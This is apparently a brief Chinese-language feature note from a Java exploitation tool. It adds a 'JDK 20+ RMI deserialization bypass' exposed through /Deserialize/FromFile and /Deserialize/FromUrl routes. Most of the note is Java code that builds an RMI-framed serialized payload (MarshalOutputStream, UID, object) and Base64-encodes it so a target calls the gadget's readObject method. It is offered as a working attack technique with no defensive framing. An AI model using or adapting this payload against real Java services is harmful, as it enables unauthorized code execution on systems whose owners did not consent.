增加 JDK 20+ RMI 反序列化绕过

走 /Deserialize/FromFile 和 /Deserialize/FromUrl 路由。

序列化数据生成：
```java
Test test = new Test();

ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
DataOutputStream dataOutputStream = new DataOutputStream(byteArrayOutputStream);
ObjectOutputStream objectOutputStream = new MarshalOutputStream(dataOutputStream, "");
objectOutputStream.writeByte(2);
new UID().write(objectOutputStream);
objectOutputStream.writeObject(new HashMap());
objectOutputStream.close();
dataOutputStream.close();
byteArrayOutputStream.close();

byte[] data = byteArrayOutputStream.toByteArray();
System.out.println(Base64.getEncoder().encodeToString(data));
System.out.println(data.length);
```

会调用 Test 的 readObject 方法。